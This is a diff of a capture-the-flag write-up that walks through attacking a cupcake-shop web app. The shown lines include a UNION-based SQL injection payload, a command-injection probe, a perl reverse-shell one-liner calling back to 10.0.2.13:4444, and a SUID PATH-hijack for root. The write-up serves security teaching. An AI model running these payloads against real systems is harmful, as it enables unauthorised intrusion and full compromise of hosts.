@@ -145,7 +145,7 @@ I proceeded to try to test an SQL injection by searching with a single quote. Th
 ![SQLqueryLeaked]
 By scrolling down to see the traceback message, we can clearly see partially the source code of `/var/www/JDC2017-webapp/foodpolar/cupcake/views.py`
 
-```
+```sql
 "SELECT id, name, salesprice, usualprice, is_onsales FROM cupcake_cupcake WHERE name LIKE '" + keyword + "'")
 ```
 
@@ -187,6 +187,7 @@ With the help of the cheatsheet, we managed to find a SECRETTABLE in the databas
 keyword=' union select 1,name,sql,4,type FROM sqlite_master WHERE type='table' and name='SECRETTABLE'; --
 
 Googling for finding out the columns of a table leads to https://stackoverflow.com/questions/685206/how-to-get-a-list-of-column-names
+
 sqlite_master's column sql store the sql query used to create the table, hence showing us the column names too.
 
 ![SecretTableFlag]
@@ -201,10 +202,13 @@ Remember the wget error message was shown in the picture of the cupcake I added 
 ![WhichStream]
 
 I went to try out which stream does wget error goes by experimenting it on my kali.
+
 In linux shell, there are 3 file descriptors. 
 
 0: stdin
+
 1: stdout
+
 2: stderr
 
 From the above screenshot, wget display error message on stderr.
@@ -227,12 +231,13 @@ When we view the cupcake, we see "Permission Denied" meaning we successfully don
 ![ReverseShellOneLiner]
 We can google for one liner reverse shell.
 I personally like to use the perl reverse shell from pentestmonkey.
+
 You can check if perl is on the machine via `;perl --help #` command injection
 
 ![SetupListener]
 I find my own ip address and set up a simple netcat listener at port 4444.
 
-```
+```perl
 perl -e 'use Socket;$i="10.0.2.13";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
@@ -268,7 +273,7 @@ SUID program will run as the owner. Hence, if we can cause the program to spawn 
 Conveniently, the programmer forgot to remove his source code getdate.c
 
 
-```
+```c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -287,7 +292,7 @@ Supposed we wrote a shell spawning binary and name it exactly as 'date' and prep
 #### our own date.c
 
 ![ownDateSource]
-We copy and paste the source code and instead of calling `date`, we call `/bin/bash`
+We copy and paste the source code and instead of calling `date`, we call `/bin/sh`
 
 ![filetransfer1]
 We set up a simple webserver on our kali for file transfer
